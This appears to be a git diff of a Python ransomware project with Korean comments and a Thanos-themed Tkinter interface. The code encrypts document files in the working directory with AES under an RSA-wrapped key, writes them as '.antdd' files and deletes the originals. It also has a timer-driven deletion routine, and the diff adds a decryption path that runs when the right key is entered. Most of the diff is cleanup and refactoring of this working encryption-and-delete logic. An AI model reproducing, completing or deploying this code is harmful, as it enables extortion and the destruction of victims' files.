@@ -22,7 +22,7 @@ iv = os.urandom(16)
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
 
 class tk:
-    def __init__(self,parent=None):
+    def __init__(self, parent=None):
         self.parent = parent
         self.pw = ""
         self.window = tkinter.Tk()
@@ -67,26 +67,26 @@ class tk:
         self.pw = str(self.password.get())
         # self.l_input.destroy()
         self.l_input = tkinter.Label(self.window, text="키가 입력되었다 => " + self.pw, fg="red", bg="black",
-                                   font="Helvetica 18 bold")
+                                     font="Helvetica 18 bold")
         self.l_input.pack()
         self.parent and self.parent.checkPassword(self.pw)
-        #self.pwbutton.destroy()
+        # self.pwbutton.destroy()
 
     def imagechange(self):
         # gif 출력
         self.l_thanos.destroy()
-        self.l_thanos = thanos.AnimatedGIF(self.window, "../ui/thanos1.gif")    ##self.window로 수정
+        self.l_thanos = thanos.AnimatedGIF(self.window, "../ui/thanos1.gif")  ##self.window로 수정
         self.l_thanos.pack()
         # 다시 타노스얼굴 사진
         sleep(2)
         self.l_thanos.destroy()
-        self.l_thanos = tkinter.Label(self.window, image=self.thanos)    ##self.window로 수정 #self.thanos로 수정
+        self.l_thanos = tkinter.Label(self.window, image=self.thanos)  ##self.window로 수정 #self.thanos로 수정
         self.l_thanos.pack()
 
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
-def list_files(path, ext=None):
+def list_files(path):  # ext 안쓰더라 지워버림
     filelist = []
     extlist = \
         ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
@@ -105,6 +105,16 @@ def list_files(path, ext=None):
     print("filelist: \n", filelist)
     return filelist
 
+
+def dec_list_files(path):  # checkPassword에서 password 같은 경우 호출한다
+    dec_filelist = []
+    for name in os.listdir(path):
+        if name.endswith(".antdd"):
+            dec_filelist.append(name)
+        else:
+            continue
+    print("dec_filelist: \n", dec_filelist)
+    return dec_filelist
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 
@@ -163,7 +173,7 @@ def allRemovePrint(gui):
     gui.window.destroy()
 
 
-def remove_files(gui, remove_filelist, ext=None):
+def remove_files(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
@@ -209,11 +219,11 @@ def remove_files(gui, remove_filelist, ext=None):
 def enc(key, cipher, in_filename, out_filename=None):
     # RSA 로 AES 키 암호화
     ciphertext = cipher.encrypt(key)  # 128비트
-    #print(cipher.decrypt(ciphertext))
-    #print("\nRSA를 통한 key 암호화문 : \n", ciphertext, "\n")
+    # print(cipher.decrypt(ciphertext))
+    # print("\nRSA를 통한 key 암호화문 : \n", ciphertext, "\n")
     # /////////////////////////////////////////////////
 
-    #print("---START ENCRYPTION : AES")
+    # print("---START ENCRYPTION : AES")
     mode = AES.MODE_CBC
     # iv = b'Sixteen byte iv3'
 
@@ -228,16 +238,16 @@ def enc(key, cipher, in_filename, out_filename=None):
         # 일단 읽어온 것을 출력해보자
         data = infile.read()
 
-        #print("1. Plain Message was: ")
-        #print(data, '\n', len(data))
+        # print("1. Plain Message was: ")
+        # print(data, '\n', len(data))
         sizeOfData = len(data)
 
         # 패딩에 대한 부분
         length = 16 - (len(data) % 16)
         data += bytes([length]) * length
 
-        #print("2. After Padding Message was: ")
-        #print(data)
+        # print("2. After Padding Message was: ")
+        # print(data)
 
         with open(out_filename, 'wb') as outfile:
             pass
@@ -246,15 +256,15 @@ def enc(key, cipher, in_filename, out_filename=None):
         with open(out_filename, 'ab') as outfile:
             # RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
             outfile.write(b'0' * (64832 - len(str(sizeOfData))) + str(sizeOfData).encode())
-            #print('\ndata size : ', len(b'0' * (64832 - len(str(sizeOfData))) + str(sizeOfData).encode()))
+            # print('\ndata size : ', len(b'0' * (64832 - len(str(sizeOfData))) + str(sizeOfData).encode()))
             # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
             outfile.write(ciphertext)
             encryptor = AES.new(key, mode, iv)
             e_data = encryptor.encrypt(data)
             # 그럼 e_data도 마찬가지로 b''형식이다.
 
-            #print("3. e_data Message was: ")
-            #print(e_data)
+            # print("3. e_data Message was: ")
+            # print(e_data)
 
             outfile.write(e_data)
 
@@ -263,42 +273,42 @@ def enc(key, cipher, in_filename, out_filename=None):
         print("4. encryption result is: ", out_filename)
         print(result.read())
 
-    #print("---END ENCRYPTION : AES")
+    # print("---END ENCRYPTION : AES")
 
 
-def dec(cipher, in_filename, out_filename):
-    #print("---START DECRYPTION : AES")
+def dec(cipher, in_filename, out_filename=None):
+    # print("---START DECRYPTION : AES")
 
     mode = AES.MODE_CBC
     # iv = b'Sixteen byte iv3'
 
     if not out_filename:
         out_filename = os.path.splitext(in_filename)[0]
-    #print(out_filename)
+    # print(out_filename)
 
     with open(in_filename, 'rb') as infile:
         e_data = infile.read()
-        #print('size : ', e_data[:64832])
+        # print('size : ', e_data[:64832])
         # RSA : 파일의 크기와 암호화된 AES 키 추출
         sizeOfData = int(e_data[:64832].lstrip(b'0').decode())
         aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
-        #print(len(aes_key_enc), aes_key_enc)
+        # print(len(aes_key_enc), aes_key_enc)
         # RSA : 암호화된 진짜 원본 데이터 추출
         e_data = e_data[64960:]
 
         # RSA : 추출한 AES 키 복호환
         aes_key_dec = cipher.decrypt(aes_key_enc)
-        #print('AES key was :', aes_key_dec)
-        #print("1. Cipher was: ")
-        #print(e_data)
+        # print('AES key was :', aes_key_dec)
+        # print("1. Cipher was: ")
+        # print(e_data)
 
         with open(out_filename, 'wb') as outfile:
             decryptor = AES.new(aes_key_dec, mode, iv)
 
             d_data = decryptor.decrypt(e_data)
 
-            #print("2. before unpadding d_data")
-            #print(d_data)
+            # print("2. before unpadding d_data")
+            # print(d_data)
 
             d_data = d_data[:sizeOfData]
             # 패딩 처리한 부분을 다시 지워준다
@@ -310,7 +320,7 @@ def dec(cipher, in_filename, out_filename):
             ##target의 내용이 한글인 경우 에러발생
             # 아스키코드로 진행된 경우
 
-            #print("3. after unpadding d_data")
+            # print("3. after unpadding d_data")
             # print(d_data.decode(encoding='utf-8'))
 
             outfile.write(d_data)
@@ -322,7 +332,7 @@ def dec(cipher, in_filename, out_filename):
         print("4. decryption result is: ", out_filename)
         print(result.read())
 
-    #print("---END DECRYPTION : AES")
+    # print("---END DECRYPTION : AES")
 
 
 # ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////메인함수
@@ -331,37 +341,34 @@ class RealMain:
 
     def __init__(self):
         self.key = os.urandom(16)
-        self.private_key = ""
-        self.test_input_key = ""
+
+        # RSA : 키, 싸이퍼 생성
+        self.random_generator = Random.new().read
+        self.rsa_key = RSA.generate(1024, self.random_generator)  # 키 정보 객체
+        self.cipher = PKCS1_OAEP.new(self.rsa_key)
+        self.private_key = self.rsa_key.export_key()
+
+        self.test_input_key = os.urandom(16) # gui에서 잘 받아오는지 확인하기 위한 변수
 
     def main(self):
-        #key = os.urandom(16)
-
         # gui 객체 생성
         gui = tk(parent=self)
 
-        # RSA : 키, 싸이퍼 생성
-        random_generator = Random.new().read
-        rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
-        cipher = PKCS1_OAEP.new(rsa_key)
-        self.private_key = rsa_key.export_key()
         print("비밀키는 : ", self.private_key)
-
-        self.test_input_key = os.urandom(16)
-        print("test_input_key는 : ", str(self.test_input_key))
+        print("test_input_key는 : ", str(self.test_input_key)) #랜섬웨어 자체랑 관계 없음 다 지워버려야함
 
         # timer 테스트
         enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
         original_targetlist = enc_targetlist  # 원본파일 삭제시 사용
 
         # 나중에 전체 트래킹 하는 법 알아야함
-        #print("enc_targetlist: \n", enc_targetlist)
-        #print("original_targetlist: \n", original_targetlist)
+        # print("enc_targetlist: \n", enc_targetlist)
+        # print("original_targetlist: \n", original_targetlist)
         i = 0
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
                 continue
-            enc(self.key, cipher, enc_target, out_filename=None)
+            enc(self.key, self.cipher, enc_target, out_filename=None)
             os.remove(original_targetlist[i])  # 원본 파일을 삭제
             i += 1
 
@@ -376,10 +383,14 @@ class RealMain:
         gui.window.mainloop()
 
     def checkPassword(self, input=None):
-        print("pw: ", input)
-        if ( str(self.test_input_key) == input ):#메일 서버로 private key 연결해와야함
-        #if (self.private_key == input):
+        print("gui로부터 입력한 pw: ", input)
+        if (str(self.test_input_key) == input):  # 메일 서버로 private key 연결해와야함
+            # if (self.private_key == input):
             print("==")
+            for file in dec_list_files(os.getcwd()):# 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
+                dec(self.cipher, file)
+            # gui laughing으로 바꾸는 함수도 호출
+            # auto_remove 호출
         else:
             print("!=")
 
